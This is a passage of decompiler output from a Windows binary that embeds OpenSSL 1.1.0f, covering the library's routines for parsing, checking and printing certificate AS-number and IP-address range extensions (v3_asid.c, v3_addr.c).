        v19 = unknown_libname_31(v17 + *(_QWORD *)(v7 + 16), "0123456789");
        v20 = *(_BYTE **)(v7 + 16);
        if ( v20[v17 + v19] )
        {
          sub_140024610(34, 163, 163, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 559);
          goto LABEL_13;
        }
        v21 = (char *)sub_14003BB60(v20);
        v22 = v21;
        if ( !v21 )
        {
          sub_140024610(34, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 576);
          goto LABEL_14;
        }
        v21[v13] = 0;
        v23 = sub_1400B92B0(0i64, v21);
        v11 = sub_1400B92B0(0i64, &v22[v18]);
        sub_14001D930(v22);
        if ( !v23 || !v11 )
        {
          sub_140024610(34, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 584);
          goto LABEL_15;
        }
        if ( sub_14007D950((__int64)v23, (__int64)v11) > 0 )
        {
          sub_140024610(34, 163, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 589);
          goto LABEL_15;
        }
      }
      else
      {
        if ( !(unsigned int)sub_1400B8800(v7, &v23) )
        {
          sub_140024610(34, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 570);
          goto LABEL_14;
        }
        v11 = 0i64;
      }
      if ( !(unsigned int)sub_1400A76C0((__int64)v4, v8, (__int64)v23, (__int64)v11) )
      {
        sub_140024610(34, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 594);
        goto LABEL_15;
      }
      v23 = 0i64;
LABEL_28:
      if ( ++v6 < (int)sub_1400296E0(a3) )
        continue;
      break;
    }
  }
  if ( (unsigned int)sub_1400A6FD0(*v4) && (unsigned int)sub_1400A6FD0(v4[1]) )
    return v4;
LABEL_14:
  v11 = 0i64;
LABEL_15:
  sub_140051250((unsigned int *)v4, (__int64)&unk_14011B520);
  sub_14004FD70((__int64)v23);
  sub_14004FD70((__int64)v11);
  return 0i64;
}
// 1400C8D54: using guessed type __int64 __fastcall unknown_libname_31(_QWORD, _QWORD);

//----- (00000001400A6EB0) ----------------------------------------------------
int __fastcall sub_1400A6EB0(int **a1, __int64 *a2)
{
  int *v2; // rdi
  __int64 v3; // rbx
  int v4; // eax
  _QWORD *v5; // rax
  _QWORD *v6; // rax
  int v7; // eax
  __int64 v8; // rcx
  int result; // eax
  __int64 *v10; // rcx

  v2 = *a1;
  v3 = *a2;
  v4 = **a1;
  if ( (v4 || !*((_QWORD *)v2 + 1)) && (v4 != 1 || (v5 = (_QWORD *)*((_QWORD *)v2 + 1)) == 0i64 || !*v5 || !v5[1]) )
    sub_1400234A0(
      "assertion failed: (a->type == ASIdOrRange_id && a->u.id != NULL) || (a->type == ASIdOrRange_range && a->u.range !="
      " NULL && a->u.range->min != NULL && a->u.range->max != NULL)",
      "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
      128i64);
  if ( (*(_DWORD *)v3 || !*(_QWORD *)(v3 + 8))
    && (*(_DWORD *)v3 != 1 || (v6 = *(_QWORD **)(v3 + 8)) == 0i64 || !*v6 || !v6[1]) )
  {
    sub_1400234A0(
      "assertion failed: (b->type == ASIdOrRange_id && b->u.id != NULL) || (b->type == ASIdOrRange_range && b->u.range !="
      " NULL && b->u.range->min != NULL && b->u.range->max != NULL)",
      "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
      132i64);
  }
  v7 = *v2;
  if ( !*v2 && !*(_DWORD *)v3 )
  {
    v8 = *((_QWORD *)v2 + 1);
    return sub_14007D950(v8, *(_QWORD *)(v3 + 8));
  }
  if ( v7 != 1 || *(_DWORD *)v3 != 1 )
  {
    v10 = (__int64 *)*((_QWORD *)v2 + 1);
    if ( !v7 )
      return sub_14007D950((__int64)v10, **(_QWORD **)(v3 + 8));
    v8 = *v10;
    return sub_14007D950(v8, *(_QWORD *)(v3 + 8));
  }
  result = sub_14007D950(**((_QWORD **)v2 + 1), **(_QWORD **)(v3 + 8));
  if ( !result )
    return sub_14007D950(*(_QWORD *)(*((_QWORD *)v2 + 1) + 8i64), *(_QWORD *)(*(_QWORD *)(v3 + 8) + 8i64));
  return result;
}

//----- (00000001400A6FD0) ----------------------------------------------------
__int64 __fastcall sub_1400A6FD0(__int64 a1)
{
  unsigned int v1; // r12d
  _DWORD *v3; // rdi
  int v4; // ebx
  int v5; // esi
  __int64 v6; // rdi
  __int64 v7; // rbx
  __int64 v8; // r14
  __int64 v9; // rbp
  __int64 v10; // rsi
  __int64 v11; // r13
  __int64 *v12; // rax
  __int64 *v13; // rax
  _DWORD *v14; // rax
  _DWORD *v15; // rax
  _QWORD *v16; // rax
  int v17; // ebx
  int v18; // esi
  int v19; // eax
  __int64 v20; // rax
  int v22; // [rsp+80h] [rbp+8h]
  int v23; // [rsp+88h] [rbp+10h]
  __int64 v24; // [rsp+90h] [rbp+18h]
  _DWORD *v25; // [rsp+98h] [rbp+20h]

  v1 = 0;
  v25 = 0i64;
  v3 = 0i64;
  v24 = 0i64;
  if ( !a1 || !*(_DWORD *)a1 )
    return 1i64;
  if ( *(_DWORD *)a1 == 1 && (unsigned int)sub_1400296E0(*(unsigned int **)(a1 + 8)) )
  {
    sub_140029830(*(int **)(a1 + 8));
    v4 = 0;
    v22 = 0;
    if ( (int)(sub_1400296E0(*(unsigned int **)(a1 + 8)) - 1) <= 0 )
    {
LABEL_43:
      v19 = sub_1400296E0(*(unsigned int **)(a1 + 8));
      v20 = sub_140029880(*(_QWORD *)(a1 + 8), v19 - 1);
      if ( !v20
        || *(_DWORD *)v20 != 1
        || sub_14007D950(**(_QWORD **)(v20 + 8), *(_QWORD *)(*(_QWORD *)(v20 + 8) + 8i64)) <= 0 )
      {
        if ( !(unsigned int)sub_1400A7410(a1) )
          sub_1400234A0(
            "assertion failed: ASIdentifierChoice_is_canonical(choice)",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            473i64);
        v1 = 1;
      }
    }
    else
    {
      v5 = 1;
      v23 = 1;
      while ( 1 )
      {
        v6 = sub_140029880(*(_QWORD *)(a1 + 8), v4);
        v7 = sub_140029880(*(_QWORD *)(a1 + 8), v5);
        v8 = 0i64;
        v9 = 0i64;
        v10 = 0i64;
        v11 = 0i64;
        if ( !v6 )
          sub_1400234A0(
            "assertion failed: aor != NULL && min != NULL && max != NULL",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            238i64);
        if ( *(_DWORD *)v6 )
        {
          if ( *(_DWORD *)v6 == 1 )
          {
            v12 = *(__int64 **)(v6 + 8);
            v8 = *v12;
            v9 = v12[1];
          }
        }
        else
        {
          v8 = *(_QWORD *)(v6 + 8);
          v9 = v8;
        }
        if ( !v7 )
          sub_1400234A0(
            "assertion failed: aor != NULL && min != NULL && max != NULL",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            238i64);
        if ( *(_DWORD *)v7 )
        {
          if ( *(_DWORD *)v7 == 1 )
          {
            v13 = *(__int64 **)(v7 + 8);
            v10 = *v13;
            v11 = v13[1];
          }
        }
        else
        {
          v10 = *(_QWORD *)(v7 + 8);
          v11 = v10;
        }
        if ( sub_14007D950(v8, v10) > 0 )
          sub_1400234A0(
            "assertion failed: ASN1_INTEGER_cmp(a_min, b_min) <= 0",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            391i64);
        if ( sub_14007D950(v8, v9) > 0 || sub_14007D950(v10, v11) > 0 )
          break;
        if ( sub_14007D950(v9, v10) >= 0 )
        {
          sub_140024610(34, 161, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 405);
          break;
        }
        v14 = (_DWORD *)v24;
        if ( !v24 && (v14 = sub_140027200(), (v24 = (__int64)v14) == 0)
          || !sub_14007DA80(v9, (__int64)v14)
          || !(unsigned int)sub_14003E600(v24, 1ui64)
          || (v15 = sub_14007DAA0(v24, v25), (v25 = v15) == 0i64) )
        {
          sub_140024610(34, 161, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 418);
          break;
        }
        if ( sub_14007D950((__int64)v15, v10) )
        {
          v17 = v22;
          v18 = v23;
        }
        else
        {
          if ( *(_DWORD *)v6 )
          {
            if ( *(_DWORD *)v6 == 1 )
            {
              sub_14004FD70(*(_QWORD *)(*(_QWORD *)(v6 + 8) + 8i64));
              *(_QWORD *)(*(_QWORD *)(v6 + 8) + 8i64) = v11;
            }
          }
          else
          {
            v16 = sub_14001D8E0(0x10ui64);
            if ( !v16 )
            {
              sub_140024610(34, 161, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 431);
              v3 = (_DWORD *)v24;
              goto LABEL_52;
            }
            *v16 = v8;
            v16[1] = v11;
            *(_DWORD *)v6 = 1;
            *(_QWORD *)(v6 + 8) = v16;
          }
          if ( *(_DWORD *)v7 )
          {
            if ( *(_DWORD *)v7 == 1 )
              *(_QWORD *)(*(_QWORD *)(v7 + 8) + 8i64) = 0i64;
          }
          else
          {
            *(_QWORD *)(v7 + 8) = 0i64;
          }
          sub_140051250((unsigned int *)v7, (__int64)&unk_14011B440);
          sub_140029370(*(int **)(a1 + 8), v23);
          v17 = v22 - 1;
          v18 = v23 - 1;
        }
        v4 = v17 + 1;
        v5 = v18 + 1;
        v22 = v4;
        v23 = v5;
        if ( v4 >= (int)(sub_1400296E0(*(unsigned int **)(a1 + 8)) - 1) )
        {
          v3 = (_DWORD *)v24;
          goto LABEL_43;
        }
      }
      v3 = (_DWORD *)v24;
    }
LABEL_52:
    sub_14004FD70((__int64)v25);
    sub_140026FF0(v3);
    return v1;
  }
  else
  {
    sub_140024610(34, 161, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 366);
    return 0i64;
  }
}

//----- (00000001400A7410) ----------------------------------------------------
__int64 __fastcall sub_1400A7410(__int64 a1)
{
  __int64 v1; // r13
  __int64 v2; // rdi
  _DWORD *v3; // r12
  _DWORD *v4; // rbx
  int v5; // ebp
  __int64 v6; // rsi
  __int64 v7; // rdi
  __int64 v8; // r14
  __int64 v9; // r15
  __int64 v10; // rbp
  __int64 *v11; // rax
  __int64 *v12; // rax
  _DWORD *v13; // rax
  int v14; // eax
  __int64 v15; // rax
  unsigned int v16; // edi
  signed int v19; // [rsp+78h] [rbp+10h]

  v1 = 0i64;
  v2 = a1;
  v3 = 0i64;
  v4 = 0i64;
  if ( !a1 || !*(_DWORD *)a1 )
    return 1i64;
  if ( *(_DWORD *)a1 == 1 && (unsigned int)sub_1400296E0(*(unsigned int **)(a1 + 8)) )
  {
    v5 = 0;
    if ( (int)(sub_1400296E0(*(unsigned int **)(v2 + 8)) - 1) <= 0 )
    {
LABEL_28:
      v14 = sub_1400296E0(*(unsigned int **)(v2 + 8));
      v15 = sub_140029880(*(_QWORD *)(v2 + 8), v14 - 1);
      if ( !v15
        || *(_DWORD *)v15 != 1
        || sub_14007D950(**(_QWORD **)(v15 + 8), *(_QWORD *)(*(_QWORD *)(v15 + 8) + 8i64)) <= 0 )
      {
        v16 = 1;
LABEL_34:
        sub_14004FD70((__int64)v3);
        sub_140026FF0(v4);
        return v16;
      }
    }
    else
    {
      while ( 1 )
      {
        v19 = v5 + 1;
        v6 = sub_140029880(*(_QWORD *)(v2 + 8), v5);
        v7 = sub_140029880(*(_QWORD *)(v2 + 8), v5 + 1);
        v8 = 0i64;
        v9 = 0i64;
        v10 = 0i64;
        if ( !v6 )
          sub_1400234A0(
            "assertion failed: aor != NULL && min != NULL && max != NULL",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            238i64);
        if ( *(_DWORD *)v6 )
        {
          if ( *(_DWORD *)v6 == 1 )
          {
            v11 = *(__int64 **)(v6 + 8);
            v8 = *v11;
            v9 = v11[1];
          }
        }
        else
        {
          v8 = *(_QWORD *)(v6 + 8);
          v9 = v8;
        }
        if ( !v7 )
          sub_1400234A0(
            "assertion failed: aor != NULL && min != NULL && max != NULL",
            "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
            238i64);
        if ( *(_DWORD *)v7 )
        {
          if ( *(_DWORD *)v7 == 1 )
          {
            v12 = *(__int64 **)(v7 + 8);
            v10 = *v12;
            v1 = v12[1];
          }
        }
        else
        {
          v10 = *(_QWORD *)(v7 + 8);
          v1 = v10;
        }
        if ( sub_14007D950(v8, v10) >= 0 || sub_14007D950(v8, v9) > 0 || sub_14007D950(v10, v1) > 0 )
          break;
        if ( !v4 && (v4 = sub_140027200()) == 0i64
          || !sub_14007DA80(v9, (__int64)v4)
          || !(unsigned int)sub_14003E600((__int64)v4, 1ui64)
          || (v13 = sub_14007DAA0((__int64)v4, v3), (v3 = v13) == 0i64) )
        {
          sub_140024610(34, 162, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 302);
          break;
        }
        if ( sub_14007D950((__int64)v13, v10) >= 0 )
          break;
        v2 = a1;
        v5 = v19;
        v1 = 0i64;
        if ( v19 >= (int)(sub_1400296E0(*(unsigned int **)(a1 + 8)) - 1) )
          goto LABEL_28;
      }
    }
    v16 = 0;
    goto LABEL_34;
  }
  return 0i64;
}

//----- (00000001400A76A0) ----------------------------------------------------
void __fastcall sub_1400A76A0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011B520);
}

//----- (00000001400A76C0) ----------------------------------------------------
__int64 __fastcall sub_1400A76C0(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rdi
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rbx
  __int64 *v11; // rax

  v6 = a1;
  if ( !a1 )
    return 0i64;
  if ( a2 )
  {
    if ( a2 != 1 )
      return 0i64;
    v6 = a1 + 8;
  }
  if ( *(_QWORD *)v6 )
  {
    if ( !**(_DWORD **)v6 )
      return 0i64;
  }
  else
  {
    v8 = sub_140050B70((__int64)&unk_14011B4B0);
    *(_QWORD *)v6 = v8;
    if ( !v8 )
      return 0i64;
    if ( *(_QWORD *)(v8 + 8) )
      sub_1400234A0(
        "assertion failed: (*choice)->u.asIdsOrRanges == NULL",
        "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
        203i64);
    *(_QWORD *)(*(_QWORD *)v6 + 8i64) = sub_140029630((__int64)sub_1400A6EB0);
    if ( !*(_QWORD *)(*(_QWORD *)v6 + 8i64) )
      return 0i64;
    **(_DWORD **)v6 = 1;
  }
  v9 = sub_140050B70((__int64)&unk_14011B440);
  v10 = v9;
  if ( !v9 )
    return 0i64;
  if ( !a4 )
  {
    *(_DWORD *)v9 = 0;
    *(_QWORD *)(v9 + 8) = a3;
    goto LABEL_18;
  }
  *(_DWORD *)v9 = 1;
  v11 = (__int64 *)sub_140050B70((__int64)&unk_14011B3D0);
  *(_QWORD *)(v10 + 8) = v11;
  if ( v11 )
  {
    sub_14004FD70(*v11);
    **(_QWORD **)(v10 + 8) = a3;
    sub_14004FD70(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64));
    *(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) = a4;
LABEL_18:
    if ( (unsigned int)sub_1400297C0(*(int **)(*(_QWORD *)v6 + 8i64), v10) )
      return 1i64;
  }
  sub_140051250((unsigned int *)v10, (__int64)&unk_14011B440);
  return 0i64;
}

//----- (00000001400A7820) ----------------------------------------------------
__int64 __fastcall sub_1400A7820(__int64 a1, int a2)
{
  __int64 v2; // rbx
  unsigned int v4; // edi
  __int64 v5; // rax
  __int64 v6; // rax

  v2 = a1;
  if ( !a1 )
    return 0i64;
  if ( a2 )
  {
    if ( a2 != 1 )
      return 0i64;
    v2 = a1 + 8;
  }
  v4 = 0;
  if ( !*(_QWORD *)v2 )
  {
    v5 = sub_140050B70((__int64)&unk_14011B4B0);
    *(_QWORD *)v2 = v5;
    if ( !v5 )
      return 0i64;
    if ( *(_QWORD *)(v5 + 8) )
      sub_1400234A0(
        "assertion failed: (*choice)->u.inherit == NULL",
        "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c",
        170i64);
    v6 = sub_14004FE90();
    *(_QWORD *)(*(_QWORD *)v2 + 8i64) = v6;
    if ( !v6 )
      return 0i64;
    **(_DWORD **)v2 = 0;
  }
  LOBYTE(v4) = **(_DWORD **)v2 == 0;
  return v4;
}

//----- (00000001400A78D0) ----------------------------------------------------
__int64 __fastcall sub_1400A78D0(__int64 a1, __int64 a2, int a3, const char *a4)
{
  int i; // edi
  __int64 v9; // rbx
  _WORD *v10; // rax
  void *v11; // rbp
  const char *v12; // rax
  char *v13; // rbx
  char *v14; // rax

  if ( !a2 )
    return 1i64;
  sub_14002A590(a1, "%*s%s:\n", a3, byte_1400D7DAE, a4);
  if ( *(_DWORD *)a2 )
  {
    if ( *(_DWORD *)a2 != 1 )
      return 0i64;
    for ( i = 0; i < (int)sub_1400296E0(*(unsigned int **)(a2 + 8)); ++i )
    {
      v9 = sub_140029880(*(_QWORD *)(a2 + 8), i);
      if ( *(_DWORD *)v9 )
      {
        if ( *(_DWORD *)v9 != 1 )
          return 0i64;
        v10 = sub_1400B8E70(0i64, **(_QWORD **)(v9 + 8));
        v11 = v10;
        if ( !v10 )
          return 0i64;
        sub_14002A590(a1, "%*s%s-", (unsigned int)(a3 + 2), byte_1400D7DAE, v10);
        sub_14001D930(v11);
        v12 = (const char *)sub_1400B8E70(0i64, *(_QWORD *)(*(_QWORD *)(v9 + 8) + 8i64));
        v13 = (char *)v12;
        if ( !v12 )
          return 0i64;
        sub_14002A590(a1, "%s\n", v12);
      }
      else
      {
        v14 = (char *)sub_1400B8E70(0i64, *(_QWORD *)(v9 + 8));
        v13 = v14;
        if ( !v14 )
          return 0i64;
        sub_14002A590(a1, "%*s%s\n", (unsigned int)(a3 + 2), byte_1400D7DAE, v14);
      }
      sub_14001D930(v13);
    }
  }
  else
  {
    sub_14002A590(a1, "%*sinherit\n", (unsigned int)(a3 + 2), byte_1400D7DAE);
  }
  return 1i64;
}

//----- (00000001400A7A90) ----------------------------------------------------
void *sub_1400A7A90()
{
  return &unk_14011BAD0;
}

//----- (00000001400A7AA0) ----------------------------------------------------
__int64 __fastcall sub_1400A7AA0(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4)
{
  int i; // ebp
  __int64 v8; // rax
  int **v9; // rsi
  unsigned __int8 *v10; // rcx
  int v11; // ebx
  int *v12; // rax
  int v13; // edx
  __int64 result; // rax
  __int64 v15; // [rsp+20h] [rbp-28h]

  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v8 = sub_140029880((__int64)a2, i);
    v9 = (int **)v8;
    if ( v8 && *(_QWORD *)v8 && (v10 = *(unsigned __int8 **)(*(_QWORD *)v8 + 8i64)) != 0i64 )
      v11 = v10[1] | (*v10 << 8);
    else
      v11 = 0;
    if ( v11 == 1 )
    {
      sub_14002A590(a3, "%*sIPv4", a4, byte_1400D7DAE);
    }
    else if ( v11 == 2 )
    {
      sub_14002A590(a3, "%*sIPv6", a4, byte_1400D7DAE);
    }
    else
    {
      LODWORD(v15) = v11;
      sub_14002A590(a3, "%*sUnknown AFI %u", a4, byte_1400D7DAE, v15);
    }
    v12 = *v9;
    if ( **v9 > 2 )
    {
      switch ( *(_BYTE *)(*((_QWORD *)v12 + 1) + 2i64) )
      {
        case 1:
          sub_14002A1A0(a3, (__int64)" (Unicast)");
          break;
        case 2:
          sub_14002A1A0(a3, (__int64)" (Multicast)");
          break;
        case 3:
          sub_14002A1A0(a3, (__int64)" (Unicast/Multicast)");
          break;
        case 4:
          sub_14002A1A0(a3, (__int64)" (MPLS)");
          break;
        case 0x40:
          sub_14002A1A0(a3, (__int64)" (Tunnel)");
          break;
        case 0x41:
          sub_14002A1A0(a3, (__int64)" (VPLS)");
          break;
        case 0x42:
          sub_14002A1A0(a3, (__int64)" (BGP MDT)");
          break;
        case 0x80:
          sub_14002A1A0(a3, (__int64)" (MPLS-labeled VPN)");
          break;
        default:
          sub_14002A590(a3, " (Unknown SAFI %u)", *(unsigned __int8 *)(*((_QWORD *)v12 + 1) + 2i64));
          break;
      }
    }
    v13 = *v9[1];
    if ( v13 )
    {
      if ( v13 == 1 )
      {
        sub_14002A1A0(a3, (__int64)":\n");
        result = sub_1400A9190(a3, a4 + 2, *((unsigned int **)v9[1] + 1), v11);
        if ( !(_DWORD)result )
          return result;
      }
    }
    else
    {
      sub_14002A1A0(a3, (__int64)": inherit\n");
    }
  }
  return 1i64;
}
// 1400A7B47: variable 'v15' is possibly undefined

//----- (00000001400A7D60) ----------------------------------------------------
void *sub_1400A7D60()
{
  return &unk_14011B930;
}

//----- (00000001400A7D70) ----------------------------------------------------
void *sub_1400A7D70()
{
  return &unk_14011B9A0;
}

//----- (00000001400A7D80) ----------------------------------------------------
void *sub_1400A7D80()
{
  return &unk_14011BA10;
}

//----- (00000001400A7D90) ----------------------------------------------------
void *sub_1400A7D90()
{
  return &unk_14011BA80;
}

//----- (00000001400A7DA0) ----------------------------------------------------
int *__fastcall sub_1400A7DA0(__int64 a1, __int64 a2, unsigned int *a3)
{
  unsigned int *v3; // rsi
  int *v4; // rbx
  int v6; // edi
  _QWORD *v7; // r14
  char *v8; // r13
  int v9; // esi
  const char *v10; // rdi
  int v11; // r12d
  char *v12; // rcx
  unsigned int v13; // eax
  char *v14; // rcx
  unsigned int v15; // ebx
  __int64 v16; // rax
  char *v17; // rcx
  char v18; // al
  char *v19; // rcx
  __int64 v20; // rax
  char *v21; // rax
  char *v22; // r15
  __int64 v23; // rcx
  char v24; // al
  int v25; // eax
  char *v26; // rdi
  int v27; // ebp
  __int64 v28; // rcx
  int v29; // ebp
  int v30; // ebx
  int v31; // eax
  int *v32; // rbp
  int v33; // ebx
  int v34; // eax
  size_t v35; // r8
  int *v36; // rax
  int *v37; // rdi
  int v38; // esi
  int v39; // r9d
  unsigned int *v40; // rbx
  int *v41; // rbx
  unsigned int *v42; // rdi
  int *v43; // [rsp+40h] [rbp-88h]
  char *EndPtr; // [rsp+48h] [rbp-80h] BYREF
  int v45; // [rsp+50h] [rbp-78h]
  char v46[4]; // [rsp+54h] [rbp-74h] BYREF
  const char *v47; // [rsp+58h] [rbp-70h]
  unsigned int *v48; // [rsp+60h] [rbp-68h] BYREF
  unsigned int *v49; // [rsp+68h] [rbp-60h] BYREF
  unsigned int *v50; // [rsp+70h] [rbp-58h]
  __int128 Buf1; // [rsp+78h] [rbp-50h] BYREF
  __int128 Buf2; // [rsp+88h] [rbp-40h] BYREF

  v50 = a3;
  v3 = a3;
  v43 = (int *)sub_140029630((__int64)sub_1400A84E0);
  v4 = v43;
  if ( !v43 )
  {
    sub_140024610(34, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 896);
    return 0i64;
  }
  v6 = 0;
  v45 = 0;
  if ( (int)sub_1400296E0(v3) <= 0 )
  {
LABEL_59:
    v22 = 0i64;
    if ( !(unsigned int)sub_1400A8BD0(v4) )
      goto LABEL_60;
    return v4;
  }
LABEL_4:
  v7 = (_QWORD *)sub_140029880((__int64)v3, v6);
  v47 = 0i64;
  v8 = 0i64;
  if ( sub_1400B9240((const char *)v7[1], "IPv4") )
  {
    if ( sub_1400B9240((const char *)v7[1], "IPv6") )
    {
      if ( !sub_1400B9240((const char *)v7[1], "IPv4-SAFI") )
      {
        v9 = 1;
        v8 = v46;
        goto LABEL_12;
      }
      if ( sub_1400B9240((const char *)v7[1], "IPv6-SAFI") )
      {
        sub_140024610(34, 159, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 919);
        goto LABEL_63;
      }
      v8 = v46;
    }
    v9 = 2;
    goto LABEL_12;
  }
  v9 = 1;
LABEL_12:
  if ( v9 == 1 )
    v10 = "0123456789.";
  else
    v10 = "0123456789.:abcdefABCDEF";
  v47 = v10;
  if ( v9 == 1 )
    v11 = 4;
  else
    v11 = 16;
  v12 = (char *)v7[2];
  if ( v8 )
  {
    v13 = strtoul(v12, &EndPtr, 0);
    v14 = EndPtr;
    v15 = v13;
    *(_DWORD *)v8 = v13;
    v16 = unknown_libname_31(v14, " \t");
    v17 = &EndPtr[v16];
    EndPtr += v16;
    if ( v15 > 0xFF || (v18 = *v17, v19 = v17 + 1, EndPtr = v19, v18 != 58) )
    {
      sub_140024610(34, 159, 164, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 943);
LABEL_63:
      sub_140023A40(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
      v22 = 0i64;
      goto LABEL_60;
    }
    v20 = unknown_libname_31(v19, " \t");
    EndPtr += v20;
    v21 = (char *)sub_14003BB60(EndPtr);
    v4 = v43;
  }
  else
  {
    v21 = (char *)sub_14003BB60(v12);
  }
  v22 = v21;
  if ( !v21 )
  {
    sub_140024610(34, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 953);
    goto LABEL_60;
  }
  v23 = 0i64;
  do
  {
    v24 = v22[v23++];
    if ( v24 != aInherit[v23 - 1] )
    {
      v25 = unknown_libname_31(v22, v10);
      v26 = &v22[v25];
      v27 = unknown_libname_31(v26, " \t") + v25;
      v28 = v27;
      v29 = v27 + 1;
      v30 = v22[v28];
      *v26 = 0;
      if ( (unsigned int)sub_1400B8D90(&Buf1, v22) != v11 )
      {
        sub_140024610(34, 159, 166, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 979);
        goto LABEL_65;
      }
      if ( !v30 )
      {
        v32 = v43;
        v41 = (int *)sub_1400A9970(v43, v9, v8);
        if ( v41 && (unsigned int)sub_1400A9600((__int64 *)&v49, &Buf1, 8 * v11) )
        {
          v42 = v49;
          if ( (unsigned int)sub_1400297C0(v41, (__int64)v49) )
            goto LABEL_57;
          sub_140051250(v42, (__int64)&unk_14011B9A0);
        }
        sub_140024610(34, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1026);
        goto LABEL_61;
      }
      if ( v30 == 45 )
      {
        v33 = unknown_libname_31(&v22[v29], " \t") + v29;
        v34 = v33 + unknown_libname_31(&v22[v33], v47);
        if ( v33 == v34 || v22[v34] )
        {
          sub_140024610(34, 159, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1003);
          goto LABEL_65;
        }
        if ( (unsigned int)sub_1400B8D90(&Buf2, &v22[v33]) != v11 )
        {
          sub_140024610(34, 159, 166, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1009);
          goto LABEL_65;
        }
        if ( v9 == 1 )
          v35 = 4i64;
        else
          v35 = 16i64;
        if ( memcmp(&Buf1, &Buf2, v35) > 0 )
        {
          sub_140024610(34, 159, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1015);
          goto LABEL_65;
        }
        v32 = v43;
        v36 = (int *)sub_1400A9970(v43, v9, v8);
        v37 = v36;
        v38 = v9 - 1;
        if ( v38 )
        {
          if ( v38 == 1 )
            v39 = 16;
          else
            v39 = 0;
        }
        else
        {
          v39 = 4;
        }
        if ( v36 && (unsigned int)sub_1400A9700((__int64 *)&v48, (char *)&Buf1, (char *)&Buf2, v39) )
        {
          v40 = v48;
          if ( (unsigned int)sub_1400297C0(v37, (__int64)v48) )
          {
LABEL_57:
            v4 = v32;
            goto LABEL_58;
          }
          sub_140051250(v40, (__int64)&unk_14011B9A0);
        }
        sub_140024610(34, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1020);
        goto LABEL_61;
      }
      if ( v30 != 47 )
      {
        sub_140024610(34, 159, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 1032);
        goto LABEL_65;
      }
      v31 = strtoul(&v22[v29], &EndPtr, 10);
      if ( EndPtr == &v22[v29] || *EndPtr )
      {
        sub_140024610(34, 159, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 989);
        goto LABEL_65;
      }
      v4 = v43;
      if ( !(unsigned int)sub_1400A8B50(v43, v9, v8, &Buf1, v31) )
      {
        sub_140024610(34, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 994);
        v32 = v43;
        goto LABEL_61;
      }
LABEL_58:
      sub_14001D930(v22);
      v3 = v50;
      v6 = ++v45;
      if ( v6 >= (int)sub_1400296E0(v50) )
        goto LABEL_59;
      goto LABEL_4;
    }
  }
  while ( v23 != 8 );
  if ( (unsigned int)sub_1400A8AD0(v4, v9, v8) )
    goto LABEL_58;
  sub_140024610(34, 159, 165, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c", 964);
LABEL_65:
  sub_140023A40(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
LABEL_60:
  v32 = v43;
LABEL_61:
  sub_14001D930(v22);
  sub_140029720(v32, (void (*)(void))sub_1400A8530);
  return 0i64;
}
// 1400A7EEE: conditional instruction was optimized away because esi.4==2
// 1400A7F0F: conditional instruction was optimized away because esi.4==2
// 1400A8162: conditional instruction was optimized away because esi.4==2
// 1400C8D54: using guessed type __int64 __fastcall unknown_libname_31(_QWORD, _QWORD);

//----- (00000001400A84E0) ----------------------------------------------------
int __fastcall sub_1400A84E0(const void ****a1, const void ****a2)
{
